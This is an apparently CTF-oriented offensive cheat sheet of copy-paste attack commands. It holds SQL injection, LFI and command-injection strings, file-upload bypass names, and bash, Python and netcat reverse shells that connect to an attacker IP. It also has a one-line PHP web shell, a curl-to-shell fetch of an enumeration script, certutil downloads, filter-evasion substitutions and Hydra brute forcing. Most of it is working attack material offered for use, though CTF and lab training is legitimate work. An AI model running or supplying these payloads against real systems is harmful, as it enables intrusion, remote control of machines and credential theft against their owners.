# 🚨 CTF EMERGENCY CHEAT SHEET - KEEP THIS OPEN!

## ⚡ SUPER QUICK REFERENCE

### 🎯 FIRST STEPS (2 minutes)
```bash
export IP=<TARGET_IP>
export MYIP=<YOUR_IP>

# Quick scan
nmap -T4 -F $IP

# While scanning, check web
curl -I http://$IP
whatweb http://$IP
```

### 🔍 RECON ONELINERS
```bash
# Fast full port scan
nmap -p- --min-rate=1000 -T4 $IP

# Service detection
nmap -p <ports> -sCV $IP -oN scan.txt

# UDP top 100
sudo nmap -sU -F $IP

# Web dirs
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -t 50 -q
```

### 🌐 WEB QUICK TESTS
```bash
# SQL injection
' OR 1=1-- -
admin' OR '1'='1

# LFI
../../../etc/passwd
....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php

# RCE
; ls
| ls
`ls`
$(ls)

# Upload bypass
shell.php.jpg
shell.php5
shell.phtml
```

### 🐚 INSTANT REVERSE SHELLS
```bash
# BASH (fastest!)
bash -i >& /dev/tcp/$MYIP/4444 0>&1

# PYTHON
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$MYIP'",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# NETCAT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MYIP 4444 >/tmp/f

# LISTENER (your machine)
nc -lvnp 4444
# OR better:
pwncat-cs -l 4444
```

### ⬆️ UPGRADE SHELL (DO THIS FIRST!)
```bash
# Method 1 (Python - BEST)
python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export TERM=xterm

# Method 2 (Script)
script /dev/null -c bash
```

### 🔓 LINUX PRIVESC - 5 MINUTE CHECK
```bash
# Golden commands
sudo -l                              # Sudo rights?
find / -perm -4000 2>/dev/null      # SUID binaries
getcap -r / 2>/dev/null             # Capabilities
cat /etc/crontab                    # Cron jobs
ls -la /home                        # User dirs
cat /etc/passwd | grep sh$          # Users with shells

# Quick enum scripts
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# GTFOBins for SUID
# https://gtfobins.github.io/
```

### 🔐 QUICK HASH CRACKING
```bash
# Identify hash
hash-identifier

# John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force

# Online (fastest!)
# https://crackstation.net/
# https://hashes.com/en/decrypt/hash
```

### 📤 FILE TRANSFER (2 methods)
```bash
# YOUR MACHINE: Start server
python3 -m http.server 8000

# TARGET: Download
wget http://$MYIP:8000/file
# OR
curl http://$MYIP:8000/file -o file
# OR (Windows)
certutil -urlcache -f http://$MYIP:8000/file file
```

### 🎪 COMMON CTF TRICKS

#### Find Flags
```bash
find / -name "*flag*" 2>/dev/null
grep -r "flag{" / 2>/dev/null
locate flag
```

#### Hidden Files/Dirs
```bash
ls -la
find / -name ".*" 2>/dev/null
```

#### Base64 Decode
```bash
echo "ZmxhZ3t0ZXN0fQ==" | base64 -d
```

#### Extract from Images (Steganography)
```bash
strings image.jpg | grep flag
binwalk -e image.jpg
steghide extract -sf image.jpg
exiftool image.jpg
```

#### JWT Decode
```bash
# Split by dots, base64 decode parts
echo "<JWT_PART>" | base64 -d
# Or online: https://jwt.io/
```

#### Port Forwarding (internal services)
```bash
# SSH local forward
ssh -L 8080:localhost:80 user@$IP

# SSH dynamic (SOCKS proxy)
ssh -D 9050 user@$IP
# Then use proxychains
```

### 🗂️ QUICK FILE ANALYSIS
```bash
# File type
file file.bin

# Strings
strings file.bin | less

# Hexdump
xxd file.bin | less

# Extract archives
tar -xf file.tar.gz
unzip file.zip
7z x file.7z
```

### 🔧 IF STUCK (20 min rule!)
1. **Take a break** (5 min)
2. **Re-read challenge description** (hints!)
3. **Google error messages**
4. **Try another machine**
5. **Ask for hint** (if available)
6. **Come back later**

---

## 📊 PORT QUICK REFERENCE

| Port | Service | Quick Check |
|------|---------|-------------|
| 21 | FTP | `ftp $IP` (anonymous:anonymous) |
| 22 | SSH | `ssh user@$IP` |
| 23 | Telnet | `telnet $IP` |
| 25 | SMTP | `nc $IP 25` |
| 80/443 | HTTP/HTTPS | Browser + Gobuster |
| 110 | POP3 | `nc $IP 110` |
| 139/445 | SMB | `smbclient -L $IP` |
| 3306 | MySQL | `mysql -h $IP -u root` |
| 3389 | RDP | `xfreerdp /v:$IP /u:user` |
| 5432 | PostgreSQL | `psql -h $IP -U postgres` |
| 6379 | Redis | `redis-cli -h $IP` |
| 8080 | Alt HTTP | Browser |
| 27017 | MongoDB | `mongo $IP` |

---

## 🎯 COMMAND SUBSTITUTION TABLE

| Blocked | Alternative |
|---------|-------------|
| `cat` | `less`, `more`, `tac`, `nl`, `head`, `tail` |
| `ls` | `dir`, `find`, `echo *` |
| `cd` | `pushd`, `popd` |
| `nc` | `/dev/tcp/$IP/$PORT` |
| `wget` | `curl`, `fetch` |
| Space | `${IFS}`, `$9`, `<`, `{,}` |
| `/` | `${PATH:0:1}` |

---

## 🔥 EMERGENCY PAYLOADS

### PHP Web Shell (minimal)
```php
<?php system($_GET['c']); ?>
```
Usage: `http://target/shell.php?c=whoami`

### Python HTTP Server (1 line)
```bash
python3 -m http.server 8000
```

### Netcat Listener (persistent)
```bash
while true; do nc -lvnp 4444; done
```

### Quick Brute Force (Hydra)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP ssh
```

---

## 💡 PRO TIPS

1. **Always stabilize shell immediately!**
2. **Save everything** - flags, creds, commands
3. **Tab completion** - use it!
4. **History** - check `history` command
5. **Google exact error messages**
6. **Screenshot important stuff**
7. **Take breaks every hour**
8. **Enumerate, enumerate, enumerate!**

---

## 🆘 TROUBLESHOOTING

### Shell dies immediately?
```bash
# Try these instead:
sh -i
/bin/sh -i
/bin/bash -i
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Can't download files?
```bash
# Base64 transfer
# On your machine:
base64 file.txt

# On target:
echo "<BASE64>" | base64 -d > file.txt
```

### No text editor?
```bash
# Use printf
printf "content here\n" > file.txt

# Or echo
echo "content" > file.txt
```

### Reverse shell not connecting?
```bash
# Check firewall
iptables -L

# Try different port
nc -lvnp 443  # or 80, 53

# Verify connectivity
ping -c1 $MYIP
```

---

## 🏁 FINAL CHECKLIST BEFORE SUBMISSION

- [ ] Flag format correct? (flag{...}, HTB{...}, etc.)
- [ ] Copied entire flag?
- [ ] No extra spaces/newlines?
- [ ] Saved screenshot as proof?
- [ ] Documented steps for writeup?

---

## 🎮 REMEMBER

**"Enumerate → Exploit → Escalate → Exfiltrate"**

**Good luck and happy hacking! 🚀**

---

*Keep this file open in a terminal:*
```bash
watch -n 1 'cat /path/to/this/cheatsheet.md'
```
